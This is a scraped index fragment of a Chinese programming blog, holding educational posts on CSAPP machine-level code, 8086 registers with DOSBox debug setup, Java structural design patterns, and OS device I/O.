体系结构将读和执行访问控制合并成一个1位的标志，这样任何被标记为可读的页也都是可执行的。栈必须是既可读又可写的，因而栈上的字节也都是可执行的。已经实现的很多机制，能够限制一些页是可读但是不可执行的，然而这些机制通常会带来严重的性能损失。\n最近，AMD 为它的 64 位处理器的内存保护引入了”NX“（No-Execute，不执行）位，将读和执行访问模式分开，Intel 也跟进了。有了这个特性，栈可以被标记为可读和可写，但是不可执行，而检査页是否可执行由硬件来完成，效率上没有损失。\n面向返回的编程攻击 浮点代码 浮点传送和转换操作 注：(v)cvttss2si ： Convert with Truncation Scalar Single-Precision Floating-Point Value to Integer\n浮点运算操作 在浮点代码中使用位级操作 浮点比较操作 ","permalink":"https://chance7bin.github.io/posts/basic/csapp/%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA/","summary":"程序编码 代码示例 mstore.c 1 2 3 4 5 6 long mult2(long, long); void multstore(long x, long y, long *dest){ long t = mult2(x,y); *dest = t; } main.c 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 #include \u0026lt;stdio.h\u0026gt; void multstore(long, long, long *); int main(){ long d; multstore(2,3,\u0026amp;d); printf(\u0026#34;2 * 3 --\u0026gt; %ld\\n\u0026#34;,d); return 0; } long","title":"程序的机器级表示"},{"content":"2.1 通用寄存器 8086CPU 的所有寄存器都是16位的，可以存放两个字节。AX、BX、CX、DX这4个寄存器通常用来存放一般性的数据，被称为通用寄存器。\n8086CPU的上一代CPU 中的寄存器都是8位的，为了保证兼容，使原来基于上代CPU编写的程序稍加修改就可以运行在8086之上，8086CPU的AX、BX、CX、DX这4个寄存器都可分为两个可独立使用的8位寄存器来用：\nAX可分为AH和AL; BX可分为BH和 BL; CX可分为CH和 CL; DX可分为DH和 DL。 2.3 汇编指令 2.4 物理地址 我们知道，CPU访问内存单元时，要给出内存单元**（一个内存单元的大小是一字节）**的地址。所有的内存单元构成的存储空间是一个一维的线性空间，每一个内存单元在这个空间中都有唯一的地址，我们将这个唯一的地址称为物理地址。\nCPU通过地址总线送入存储器的，必须是一个内存单元的物理地址。在CPU向地址总线上发出物理地址之前，必须要在内部先形成这个物理地址。不同的CPU可以有不同的形成物理地址的方式。我们现在讨论8086CPU是如何在内部形成内存单元的物理地址的。\n2.5 16位结构的CPU 概括地讲，16位结构(16位机、字长为16位等常见说法，与16位结构的含义相同)描述了一个CPU具有下面几方面的结构特性。\n运算器一次最多可以处理16位的数据;\n寄存器的最大宽度为16位;\n寄存器和运算器之间的通路为16位。\n8086是16位结构的CPU，这也就是说，在8086内部，能够一次性处理、传输、暂时存储的信息的最大长度是16位的。内存单元的地址在送上地址总线之前，必须在CPU中处理、传输、暂时存放，对于16位CPU，能一次性处理、传输、暂时存储16位的地址。\n2.6 8086CPU给出物理地址的方法 8086CPU有20位地址总线，可以传送20位地址，达到1MB寻址能力。8086CPU 又是16位结构，在内部一次性处理、传输、暂时存储的地址为16位。从8086CPU的内部结构来看，如果将地址从内部简单地发出，那么它只能送出 16位的地址，表现出的寻址能力只有64KB（2^16^ / 1024 ）。\n8086CPU采用一种在内部用两个16位地址合成的方法来形成一个20位的物理地址。\n8086CPU相关部件的逻辑结构如图2.6所示。\n如图2.6所示，当8086CPU 要读写内存时:\n(1)CPU中的相关部件提供两个16位的地址，一个称为段地址，另一个称为偏移地址;\n(2)段地址和偏移地址通过内部总线送入一个称为地址加法器的部件;\n(3)地址加法器将两个16位地址合成为一个20位的物理地址;\n(4)地址加法器通过内部总线将20位物理地址送入输入输出控制电路;\n(5)输入输出控制电路将20位物理地址送上地址总线;\n(6)20位物理地址被地址总线传送到存储器。\n地址加法器采用 物理地址=段地址×16(左移四位)+偏移地址 的方法用段地址和偏移地址合成物理地址。例如，8086CPU要访问地址为123C8H的内存单元，此时，地址加法器的工作过程如图2.7所示(图中数据皆为十六进制表示)。\n2.8 段的概念 段的划分来自于CPU，由于8086CPU用 基础地址(段地址×16)+偏移地址=物理地址 的方式给出内存单元的物理地址，使得我们可以用分段的方式来管理内存。如图2.9所示，我们可以认为：地址10000H~100FFH的内存单元组成一个段，该段的起始地址(基础地址)为10000H，段地址为1000H，大小为 100H；我们也可以认为地址10000H~1007FH、10080H~100FFH的内存单元组成两个段，它们的起始地址(基础地址)为：10000H和10080H，段地址为：1000H和1008H，大小都为80H。\n以后，在编程时可以根据需要，将若干地址连续的内存单元看作一个段，用段地址×16定位段的起始地址(基础地址)，用偏移地址定位段中的内存单元。有两点需要注意：段地址x16必然是16的倍数，所以一个段的起始地址也一定是16的倍数；偏移地址为16位，16位地址的寻址能力为64KB，所以一个段的长度最大为64KB。\n“数据在21F60H内存单元中。”这句话对于8086PC机一般不这样讲，取而代之的是两种类似的说法:\n①数据存在内存2000:1F60单元中;\n②数据存在内存的2000H 段中的1F60H单元中。\n这两种描述都表示“数据在内存21F6OH单元中”。\n2.10 CS和IP 段地址在8086CPU的段寄存器中存放。8086CPU有4个段寄存器：CS、DS、SS、ES。当8086CPU要访问内存时由这4个段寄存器提供内存单元的段地址。\nCS 和IP是8086CPU中两个最关键的寄存器，它们指示了CPU当前要读取指令的地址。CS为代码段寄存器，IP为指令指针寄存器，从名称上我们可以看出它们和指令的关系。\n在8086PC 机中，任意时刻，设CS中的内容为M，IP中的内容为N，8086CPU将从内存M×16+N单元开始，读取一条指令并执行。\n也可以这样表述：8086机中，==任意时刻，CPU将CS:IP指向的内容当作指令执行==。图2.10展示了8086CPU读取、执行指令的工作原理\n图2.10 说明如下。\n(1) 8086CPU当前状态:CS中的内容为2000H，IP中的内容为0000H;\n(2)内存20000H~20009H单元存放着可执行的机器码;\n(3)内存20000H~20009H单元中存放的机器码对应的汇编指令如下。\n地址：20000H~-20002H，内容：B823 01，长度:3Byte，对应汇编指令：mov ax,0123H\n地址：20003H~20005H，内容：BB 03 00，长度: 3Byte，对应汇编指令：mov bx,0003H\n地址：20006H~20007H，内容：89 D8，长度: 2Byte，对应汇编指令：mov ax,bx\n地址：20008H~20009H，内容：01 D8，长度: 2Byte，对应汇编指令：add ax,bx\n8086CPU 的工作过程可以简要描述如下：\n(1)从CS:IP指向的内存单元读取指令，读取的指令进入指令缓冲器;\n(2)IP=IP+所读取指令的长度，从而指向下一条指令;\n(3)执行指令。转到步骤(1)，重复这个过程。\n在8086CPU加电启动或复位后(即CPU刚开始工作时)CS和IP被设置为CS=FFFFH，IP=0000H，即在8086PC机刚启动时，CPU从内存 FFFFOH单元中读取指令执行，FFFF0H单元中的指令是8086PC机开机后执行的第一条指令。\n2.11 修改CS、IP的指令 能够改变CS、IP 的内容的指令被统称为转移指令（ 例如jmp指令）\n若想同时修改CS、IP的内容，可用形如jmp段地址:偏移地址的指令完成，如\njmp 2AE3:3，执行后:CS=2AE3H，IP=0003H，CPU将从2AE33H处读取指令。\njmp 3:0B16，执行后:CS=0003H，IP=0B16H，CPU将从00B46H处读取指令。\njmp 段地址:偏移地址指令的功能为：用指令中给出的段地址修改CS，偏移地址修改IP。\n若想仅修改IP的内容，可用形如jmp 某一合法寄存器的指令完成，如\njmp ax，指令执行前: ax=1000H，CS=2000H，IP=0003H\n​\t指令执行后: ax=1000H，CS=2000H，IP=1000H\njmp bx，指令执行前: bx=0B16H，CS=2000H，IP=0003H\n​\t指令执行后: bx=0B16H，CS=2000H，IP=0B16H\n\u0026ldquo;jmp 某一合法寄存器”指令的功能为：用寄存器中的值修改IP。jmp ax，在含义上好似： mov IP,ax。\n安装dos 1：准备工具\n1.1 DOSBox\n1.2 debug.exe\n2：安装过程\nDOSBox安装过程：可以在官方网站下载：https://www.dosbox.com/\ndebug.exe安装：\n1.https://blog.csdn.net/lanchunhui/article/details/78151569\n2.把DEBUG.EXE放在D盘下\n3.挂载debug\n在安装目录C:\\Program Files (x86)\\DOSBox-0.74,下，找到DOSBox 0.74 Options.bat，双击进入配置\n拉到最下面，加入如下语句（MOUNT是挂载，C是参数，D:\\Debug是debug.exe存放的文件夹路径）：\n1 2 3 MOUNT C D:\\Debug C: debug 4.测试\n启动DOSBox.exe，在光标处输入dds：0，结果如下所示即安装配置成功：\nDebug Debug 是DOS、Windows都提供的实模式(8086方式)程序的调试工具。使用它，可以查看CPU各种寄存器中的内容、内存的情况和在机器码级跟踪程序的运行。\nDebug功能\n用Debug 的R命令查看、改变CPU寄存器的内容;\n用Debug的D命令查看内存中的内容; 也可以指定D命令的查看范围，此时采用d 段地址:起始偏移地址 结尾偏移地址的格式。比如要看1000:0~1000:9中的内容，可以用d 1000:0 9实现\n用Debug的E命令改写内存中的内容;\n用Debug的U命令将内存中的机器指令翻译成汇编指令;\n用Debug的T命令执行一条机器指令;\n用Debug的A命令以汇编指令的格式在内存中写入一条机器指令。\n","permalink":"https://chance7bin.github.io/posts/basic/asm/%E7%AC%AC2%E7%AB%A0-%E5%AF%84%E5%AD%98%E5%99%A8/","summary":"2.1 通用寄存器 8086CPU 的所有寄存器都是16位的，可以存放两个字节。AX、BX、CX、DX这4个寄存器通常用来存放一般性的数据，被称为通用寄存器。 80","title":"第2章 寄存器"},{"content":"适配器模式——翻译、DataAdapter 适配器模式(Adapter)，将一个类的接口转换成客户希望的另外一个接口。Adapter模式使得原本由于接口不兼容而不能一起工作的那些类可以一起工作。\n在软件开发中，也就是系统的数据和行为都正确，但接口不符时，应该考虑用适配器，目的是使控制范围之外的一个原有对象与某个接口匹配。适配器模式主要应用于希望复用一些现存的类，但是接口又与复用环境要求不一致的情况，比如在需要对早期代码复用一些功能等应用上很有实际价值。\n在GoF 的设计模式中，对适配器模式讲了两种类型，类适配器模式和对象适配器模式，由于类适配器模式通过多重继承对一个接口与另一个接口进行匹配，而C#、VB.NET、JAVA等语言都不支持多重继承（C++支持)，也就是一个类只有一个父类，所以这里主要讲的是对象适配器。\n结构图 何时使用适配器模式 在想使用一个已经存在的类，但如果它的接口，也就是它的方法和你的要求不相同时，就应该考虑用适配器模式。\n两个类所做的事情相同或相似，但是具有不同的接口时要使用它。而且由于类都共享同一个接口，使得客户代码可以统一调用同一接口，这样更简单、更直接、更紧凑。\n公司内部，类和方法的命名应该有规范，最好前期就设计好，然后如果真的接口不相同时，首先不应该考虑用适配器，而是应该考虑通过重构统一接口。\n要在双方都不太容易修改的时候再使用适配器模式适配，而不是一有不同时就使用它。\n设计之初就需要考虑用适配器模式的时候：比如公司设计一系统时考虑使用第三方开发组件，而这个组件的接口与自己的系统接口是不相同的，而我们也完全没有必要为了迎合它而改动自己的接口，此时尽管是在开发的设计阶段，也是可以考虑用适配器模式来解决接口不同的问题。\n代码实现 Player\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 public class Player { String name; public Player() { } public Player(String name) { this.name = name; } void attack(){ System.out.println(name + \u0026#34; 冲啊\u0026#34;); }; void defend(){ System.out.println(name + \u0026#34; 防啊\u0026#34;); }; } ConcretePlayer\n1 2 3 4 5 6 public class ST extends Player{ public ST(String name) { super(name); } } 1 2 3 4 5 6 public class CB extends Player{ public CB(String name) { super(name); } } need adaper class\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 public class YAO{ private String name; public void setName(String name) { this.name = name; } public void jingong() { System.out.println(\u0026#34;yao 冲啊\u0026#34;); } public void fangshou() { System.out.println(\u0026#34;yao 防啊\u0026#34;); } } Adapter\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 public class Adapter extends Player{ private YAO yao = new YAO(); public Adapter(String name) { yao.setName(name); } @Override void attack() { yao.jingong(); } @Override void defend() { yao.fangshou(); } } client\n1 2 3 4 5 6 7 8 public static void main(String[] args) { Player st = new ST(\u0026#34;st\u0026#34;); st.attack(); Player cb = new CB(\u0026#34;cb\u0026#34;); cb.attack(); Player yao = new Adapter(\u0026#34;yao\u0026#34;); yao.defend(); } 适配器模式的应用 **DataAdapter用作DataSet和数据源之间的适配器以便检索和保存数据。DataAdapter通过映射FilI（这更改了DataSet中的数据以便与数据源中的数据相匹配）和Update（这更改了数据源中的数据以便与DataSet中的数据相匹配）来提供这一适配器。**由于数据源可能是来自SQL Server，可能来自Oracle，也可能来自Access、DB2，这些数据在组织上可能有不同之处，但我们希望得到统一的DataSet（实质是XML 数据），此时用DataAdapter就是非常好的手段，我们不必关注不同数据库的数据细节,就可以灵活的使用数据。\n桥接模式——手机软件统一 很多情况用继承会带来麻烦。比如，对象的继承关系是在编译时就定义好了，所以无法在运行时改变从父类继承的实现。子类的实现与它的父类有非常紧密的依赖关系，以至于父类实现中的任何变化必然会导致子类发生变化。当需要复用子类时，如果继承下来的实现不适合解决新的问题则父类必须重写或被其他更适合的类替换。这种依赖关系限制了灵活性并最终限制了复用性。\n合成/聚合复用原则 合成/聚合复用原则（CARP），尽量使用合成/聚合，尽量不要使用类继承。\n合成（Composition，也有翻译成组合）和聚合（Aggregation）都是关联的特殊种类。**聚合表示一种弱的“拥有”关系，体现的是A对象可以包含B对象，但B对象不是A对象的一部分；合成则是一种强的“拥有”关系，体现了严格的部分和整体的关系，部分和整体的生命周期一样。**比方说，大雁有两个翅膀，翅膀与大雁是部分和整体的关系，并且它们的生命周期是相同的，于是大雁和翅膀就是合成关系。而大雁是群居动物，所以每只大雁都是属于一个雁群，一个雁群可以有多只大雁，所以大雁和雁群是聚合关系。\n合成/聚合复用原则的好处是，优先使用对象的合成/聚合将有助于你保持每个类被封装，并被集中在单个任务上。这样类和类继承层次会保持较小规模，并且不太可能增长为不可控制的庞然大物。\n桥接模式 桥接模式(Bridge)，将抽象部分与它的实现部分分离，使它们都可以独立地变化。\n什么叫抽象与它的实现分离？这并不是说，让抽象类与其派生类分离，因为这没有任何意义。实现指的是抽象类和它的派生类用来实现自己的对象。举个栗子，“手机”可以按照品牌来分类，也可以按照功能来分类。\n结构图 代码实现 Abstraction类\n1 2 3 4 5 6 7 8 9 public abstract class Phone { Software software; public void setSoftware(Software software) { this.software = software; } abstract void run(); } RefinedAbstraction类\n1 2 3 4 5 6 7 public class IOS extends Phone{ @Override void run() { super.software.run(); } } Implementor类\n1 2 3 public interface Software { void run(); } ConcreteImplementorA和 ConcreteImplementorB等派生类\n1 2 3 4 5 6 public class Excel implements Software{ @Override public void run() { System.out.println(\u0026#34;run excel\u0026#34;); } } 1 2 3 4 5 6 public class Word implements Software{ @Override public void run() { System.out.println(\u0026#34;run word\u0026#34;); } } 客户端实现\n1 2 3 4 5 6 7 public static void main(String[] args) { IOS ios = new IOS(); ios.setSoftware(new Excel()); ios.run(); ios.setSoftware(new Word()); ios.run(); } 实现系统可能有多角度分类，每一种分类都有可能变化，那么就把这种多角度分离出来让它们独立变化，减少它们之间的耦合。\n组合模式——总公司-分公司-部门 组合模式（Composite），将对象组合成树形结构以表示“部分-整体”的层次结构。组合模式使得用户对单个对象和组合对象的使用具有一致性。\n结构图 代码实现 Comonent\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 public abstract class Component { String name; public Component(String name) { this.name = name; } public abstract void add(Component component); public abstract void remove(Component component); public abstract void display(int depth); } Composite\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 public class ConcreteComponent extends Component { List\u0026lt;Component\u0026gt; children = new ArrayList\u0026lt;\u0026gt;(); public ConcreteComponent(String name) { super(name); } @Override public void add(Component component) { children.add(component); } @Override public void remove(Component component) { children.remove(component); } @Override public void display(int depth) { System.out.println(String.join(\u0026#34;\u0026#34;, Collections.nCopies(depth,\u0026#34;-\u0026#34;)) + name); for (Component child : children) { child.display(depth + 2); } } } Leaf\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 public class Leaf extends Component{ public Leaf(String name) { super(name); } @Override public void add(Component component) { } @Override public void remove(Component component) { } @Override public void display(int depth) { System.out.println(String.join(\u0026#34;\u0026#34;, Collections.nCopies(depth,\u0026#34;-\u0026#34;)) + name); } } Client\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 public static void main(String[] args) { ConcreteComponent a = new ConcreteComponent(\u0026#34;a\u0026#34;); ConcreteComponent aa = new ConcreteComponent(\u0026#34;aa\u0026#34;); Leaf ab = new Leaf(\u0026#34;ab\u0026#34;); a.add(aa); a.add(ab); ConcreteComponent ac = new ConcreteComponent(\u0026#34;ac\u0026#34;); a.add(ac); Leaf aca = new Leaf(\u0026#34;aca\u0026#34;); ac.add(aca); Leaf aaa = new Leaf(\u0026#34;aaa\u0026#34;); aa.add(aaa); a.display(1); } 应用场景 当发现需求中是体现部分与整体层次的结构时，以及希望用户可以忽略组合对象与单个对象的不同，统一地使用组合结构中的所有对象时，就应该考虑用组合模式了。\n自定义控件，也就是把一些基本的控件组合起来，通过编程写成一个定制的控件，比如用两个文本框和一个按钮就可以写一下自定义的登录框控件，实际上，所有的Web控件的基类都是System.Web.Ul.Control，而Control基类中就有Add和Remove方法，这就是典型的组合模式的应用。\n组合模式定义了包含Leaf（人力资源部和财务部）这些基本对象和ConcreteComponent（分公司、办事处）等组合对象的类层次结构。基本对象可以被组合成更复杂的组合对象，而这个组合对象又可以被组合，这样不断地递归下去，客户代码中，任何用到基本对象的地方都可以使用组合对象了。\n用户不用关心到底是处理一个叶节点还是处理一个组合组件，也就用不着为定义组合而写一些选择判断语句了。\n组合模式让客户可以一致地使用组合结构和单个对象。\n装饰模式——穿搭 装饰模式（Decorator)，动态地给一个对象添加一些额外的职责，就增加功能来说，装饰模式比生成子类更为灵活。\n结构图 装饰模式是利用SetComponent来对对象进行包装的。这样每个装饰对象的实现就和如何使用这个对象分离开了，每个装饰对象只关心自己的功能，不需要关心如何被添加到对象链当中\n如果只有一个ConcreteComponent类而没有抽象的Component类，那么 Decorator类可以是ConcreteComponent 的一个子类。同样道理，如果只有一个ConcreteDecorator类，那么就没有必要建立一个单独的Decorator类，而可以把 Decorator和ConcreteDecorator的责任合并成一个类。\n装饰模式代码实现 “Person”类（ConcreteComponent）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 public class Person { private String name; public Person() { } public Person(String name) { this.name = name; } void show(){ System.out.println(name + \u0026#34;穿衣服\u0026#34;); }; } 服饰类（Decorator）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 public class Decorator extends Person{ private Person component; public void setDecorator(Person component) { this.component = component; } @Override void show() { if (component != null) component.show(); } } 具体服饰类（ConcreteDecorator）\n1 2 3 4 5 6 7 public class Clothes extends Decorator{ @Override void show() { System.out.println(\u0026#34;衣服\u0026#34;); super.show(); } } 1 2 3 4 5 6 7 public class Pants extends Decorator{ @Override void show() { System.out.println(\u0026#34;裤子\u0026#34;); super.show(); } } 1 2 3 4 5 6 7 public class Shoe extends Decorator{ @Override void show() { System.out.println(\u0026#34;鞋子\u0026#34;); super.show(); } } 主函数\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 public class DecoratorTest { public static void main(String[] args) { Person person = new Person(\u0026#34;bin\u0026#34;); Clothes clothes = new Clothes(); Pants pants = new Pants(); Shoe shoe = new Shoe(); clothes.setDecorator(person); pants.setDecorator(clothes); shoe.setDecorator(pants); shoe.show(); } } 打印输出\n装饰模式是为已有功能动态地添加更多功能的一种方式。\n但到底什么时候用它呢？\n起初的设计中，当系统需要新功能的时候，是向旧的类中添加新的代码。这些新加的代码通常装饰了原有类的核心职责或主要行为，但这种做法的问题在于，它们在主类中加入了新的字段，新的方法和新的逻辑，从而增加了主类的复杂度，而这些新加入的东西仅仅是为了满足一些只在某种特定情况下才会执行的特殊行为的需要。而装饰模式却提供了一个非常好的解决方案，它把每个要装饰的功能放在单独的类中，并让这个类包装它所要装饰的对象，因此，当需要执行特殊行为时，客户代码就可以在运行时根据需要有选择地、按顺序地使用装饰功能包装对象了。\n装饰模式的优点是把类中的装饰功能从类中搬移去除，这样可以简化原有的类。这样做更大的好处是有效地把类的核心职责和装饰功能区分开了。而且可以去除相关类中重复的装饰逻辑。\n外观模式——买股票到买基金 外观模式(Facade)，为子系统中的一组接口提供一个一致的界面，此模式定义了一个高层接口，这个接口使得这一子系统更加容易使用。\n结构图 外观模式实现 外观类\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 public class Fund { private Stock1 stock1; private Stock2 stock2; private Stock3 stock3; public Fund() { stock1 = new Stock1(); stock2 = new Stock2(); stock3 = new Stock3(); } public void buy(){ stock1.buy(); stock2.buy(); stock3.buy(); } public void sell(){ stock1.sell(); stock2.sell(); stock3.sell(); } } 子类\n1 2 3 4 5 6 7 8 9 public class Stock1 { public void buy(){ System.out.println(\u0026#34;buy 1\u0026#34;); } public void sell(){ System.out.println(\u0026#34;sell 1\u0026#34;); } } 1 2 3 4 5 6 7 8 9 public class Stock2 { public void buy(){ System.out.println(\u0026#34;buy 2\u0026#34;); } public void sell(){ System.out.println(\u0026#34;sell 2\u0026#34;); } } 1 2 3 4 5 6 7 8 9 public class Stock3 { public void buy(){ System.out.println(\u0026#34;buy 3\u0026#34;); } public void sell(){ System.out.println(\u0026#34;sell 3\u0026#34;); } } 主函数\n1 2 3 4 5 6 7 8 9 10 11 12 public class TemplateMethodTest { public static void main(String[] args) { Template person1 = new Person1(); Template person2 = new Person2(); person1.test1(); person1.test2(); person1.test3(); person2.test1(); person2.test2(); person2.test3(); } } 何时使用外观模式 分三个阶段。\n**首先，在设计初期阶段，应该要有意识的将不同的两个层分离，**比如经典的三层架构，就需要考虑在数据访问层和业务逻辑层、业务逻辑层和表示层的层与层之间建立外观Facade，这样可以为复杂的子系统提供一个简单的接口，使得耦合大大降低。\n**其次，在开发阶段，子系统往往因为不断的重构演化而变得越来越复杂，**大多数的模式使用时也都会产生很多很小的类，这本是好事，但也给外部调用它们的用户程序带来了使用上的困难，增加外观 Facade 可以提供一个简单的接口，减少它们之间的依赖。\n第三，在维护一个遗留的大型系统时，可能这个系统已经非常难以维护和扩展了，但因为它包含非常重要的功能，新的需求开发必须要依赖于它。此时用外观模式Facade也是非常合适的。可以为新系统开发一个外观 Facade类，来提供设计粗糙或高度复杂的遗留代码的比较清晰简单的接口，让新系统与Facade对象交互，Facade 与遗留代码交互所有复杂的工作。\n对于复杂难以维护的老系统，直接去改或去扩展都可能产生很多问题，分两个小组，一个开发Facade与老系统的交互，另一个只要了解Facade的接口，直接开发新系统调用这些接口即可，可以减少很多不必要的麻烦。\n享元模式——外包 享元模式（Flyweight)，运用共享技术有效地支持大量细粒度的对象。\n结构图 享元模式可以避免大量非常相似类的开销。在程序设计中，有时需要生成大量细粒度的类实例来表示数据。如果能发现这些实例除了几个参数外基本上都是相同的，有时就能够受大幅度地减少需要实例化的类的数量。如果能把那些参数移到类实例的外面，在方法调用时将它们传递进来，就可以通过共享大幅度地减少单个实例的数目。\n享元模式Flyweight执行时所需的状态是有内部的也可能有外部的，内部状态存储于ConcreteFlyweight对象之中，而外部对象则应该考虑由客户端对象存储或计算，当调用Flyweight对象的操作时，将该状态传递给它。\n代码实现 Flyweight\n1 2 3 4 5 6 7 8 9 public abstract class Flyweight { String name; public Flyweight(String name) { this.name = name; } abstract void use(String user); } ConcreteFlyweight\n1 2 3 4 5 6 7 8 9 10 public class ConcreteFlyweight extends Flyweight{ public ConcreteFlyweight(String name) { super(name); } @Override void use(String user) { System.out.println(super.name + \u0026#34; + \u0026#34; + user); } } FlyweightFactory\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 public class FlyweightFactory { HashMap\u0026lt;String,Flyweight\u0026gt; flyweights = new HashMap\u0026lt;\u0026gt;(); public Flyweight getFlyweight(String name){ if (!flyweights.containsKey(name)){ flyweights.put(name,new ConcreteFlyweight(name)); } return flyweights.get(name); } public int count(){ return flyweights.size(); } } Client\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 public static void main(String[] args) { FlyweightFactory flyweightFactory = new FlyweightFactory(); Flyweight ali = flyweightFactory.getFlyweight(\u0026#34;ali\u0026#34;); Flyweight ali1 = flyweightFactory.getFlyweight(\u0026#34;ali\u0026#34;); Flyweight taobao = flyweightFactory.getFlyweight(\u0026#34;taobao\u0026#34;); Flyweight taobao1 = flyweightFactory.getFlyweight(\u0026#34;taobao\u0026#34;); Flyweight zijie = flyweightFactory.getFlyweight(\u0026#34;zijie\u0026#34;); ali.use(\u0026#34;bin1\u0026#34;); //ali + bin1 ali1.use(\u0026#34;bin2\u0026#34;); //ali + bin2 taobao.use(\u0026#34;bin3\u0026#34;); //taobao + bin3 taobao1.use(\u0026#34;bin4\u0026#34;); //taobao + bin4 zijie.use(\u0026#34;bin5\u0026#34;); //zijie + bin5 System.out.println(flyweightFactory.count()); //3 } 代理模式——送花 代理模式(Proxy)，为其他对象提供一种代理以控制对这个对象的访问。\n结构图 代理模式实现 代理接口\n1 2 3 4 5 6 7 public interface Person { void giveFlower(); void giveGift(); void singing(); } 代理类\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 public class Proxy implements Person{ private Person real; public Proxy(Person real) { this.real = real; } @Override public void giveFlower() { real.giveFlower(); } @Override public void giveGift() { real.giveGift(); } @Override public void singing() { real.singing(); } } 被代理类\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 public class RealPerson implements Person{ @Override public void giveFlower() { System.out.println(\u0026#34;送花\u0026#34;); } @Override public void giveGift() { System.out.println(\u0026#34;送礼物\u0026#34;); } @Override public void singing() { System.out.println(\u0026#34;唱歌\u0026#34;); } } 主函数\n1 2 3 4 5 6 7 8 public class ProxyTest { public static void main(String[] args) { Proxy proxy = new Proxy(new RealPerson()); proxy.giveFlower(); proxy.giveGift(); proxy.singing(); } } 应用场景 第一，**远程代理，也就是为一个对象在不同的地址空间提供局部代表。这样可以隐藏一个对象存在于不同地址空间的事实。**WebService在.NET 中的应用中，当在应用程序的项目中加入一个Web引用，引用一个WebService，此时会在项目中生成一个WebReference的文件夹和一些文件，其实它们就是代理，这就使得客户端程序调用代理就可以解决远程访问的问题。\n第二种应用是**虚拟代理，是根据需要创建开销很大的对象。通过它来存放实例化需要很长时间的真实对象。**这样就可以达到性能的最优化，比如打开一个很大的HTML网页时，里面可能有很多的文字和图片，但还是可以很快打开它，此时看到的是所有的文字，但图片却是一张一张地下载后才能看到。那些未打开的图片框，就是通过虚拟代理来替代了真实的图片，此时代理存储了真实图片的路径和尺寸。\n第三种应用是**安全代理，用来控制真实对象访问时的权限。**一般用于对象应该有不同的访问权限的时候。\n第四种是**智能指引，是指当调用真实的对象时，代理处理另外一些事。**如计算真实对象的引用次数，这样当该对象没有引用时，可以自动释放它；或当第一次引用一个持久对象时，将它装入内存；或在访问一个实际对象前，检查是否已经锁定它，以确保其他对象不能改变它。它们都是通过代理在访问一个对象时附加一些内务处理。\n","permalink":"https://chance7bin.github.io/posts/basic/pattern/%E7%BB%93%E6%9E%84%E5%9E%8B%E6%A8%A1%E5%BC%8F/","summary":"适配器模式——翻译、DataAdapter 适配器模式(Adapter)，将一个类的接口转换成客户希望的另外一个接口。Adapter模式使得原","title":"结构型模式"},{"content":"IO设备-显示器与键盘 学习了CPU管理，进程管理，内存管理，下面就开始设备管理的学习了\n一、文件视图 对于管理外设，首先我们要让外设设备工作运行\n使用外设：\n（1）向外设对应的端口地址发送 CPU 命令\n（2）CPU 通过端口地址发送对外设的工作要求，通常就是命令“out ax, 端口号”，其中 AX 寄存器存放的就是让外设工作的具体内容\n（3）外设开始工作，工作完成后产生中断 ，CPU 会在中断处理程序中处理外设的工作结果 但是对不同的设备进行操作很麻烦，需要查寄存器地址、内容的格式和语义， 所以操作系统要给用户提供一个简单视图—==文件视图==\n控制外设：\n1 2 3 4 5 int fd = open(“/dev/xxx”);//打开外设文件 - 不同的设备文件名对应不同的外设 for (int i = 0; i \u0026lt; 10; i++) { write(fd,i,sizeof(int));//向外设文件写入 } close(fd);关闭外设文件 (1) ==不论什么设备都是open, read, write, close==\n操作系统为用户提供统一的接口!\n(2) 不同的设备对应不同的设备文件(/dev/xxx)\n根据设备文件找到控制器的地址、 内容格式\n注：\n操作系统把一切外设都映射为文件，被称作设备文件(如磁盘文件)\n常见的设备文件又分为三种：\n1.字符设备 如键盘，鼠标，串口等(以字节为单位顺序访问)\n2.块设备 如磁盘驱动器，磁带驱动器，光驱等(均匀的数据库访问)\n3.网络设备 如以太网，无线，蓝牙等(格式化报文交换)\n二、显示器输出 以printf为例剖析操作系统怎么工作的\n1 printf(“Host Name: %s”, name); printf()函数：\n1 2 3 4 5 6 7 8 9 10 11 12 //printf()产生格式化信息输出到标准设备stdout(1),在屏幕上显示 // 参数fmt：指定输出将采用的格式 static int printf(const char *fmt, ...) { va_list args; int i; va_start(args, fmt); write(1,printbuf,i=vsprintf(printbuf, fmt, args));//printbuf数组 va_end(args); return i; } 先创建缓存buf将格式化输出都写到那里，然后再write(1,buf,…) write 的内核实现是 sys_write，sys_write 首先要做的事是找到所写文件的属性，即到底是普通文件还是设备文件。\n如果是设备文件，sys_write 要根据设备文件中存放的设备属性信息分支到相应的操作命令中\nfd是文件描述符，file的目的是得到inode， 显示器信息应该就在这里\nfd=1的文件来源于父进程（fork()） current-\u0026gt;filp 数据中存放当前进程打开的文件，如果一个文件不是当前进程打开的，那么就一定是其父进程打开后再由子进程继承来的\n1 2 3 4 5 6 void main(void) { if(!fork()){ init(); } void init(void) {open(“dev/tty0”,O_RDWR,0);dup(0);dup(0); execve(\u0026#34;/bin/sh\u0026#34;,argv,envp)} 系统初始化时init()打开了终端设备，dup()是复制，tty0是终端设备。\n在 init 函数中我们调用 open 打开一个名为“/dev/tty0”的文件，由于这是该进程打开的第一个文件，所以对应的文件句柄 fd = 0，==接下来使用了两次 dup，使得 fd = 1，fd = 2==也都指向了“/dev/tty0” 的 FCB（文件控制块）。\nopen系统调用\n1 2 3 4 5 6 7 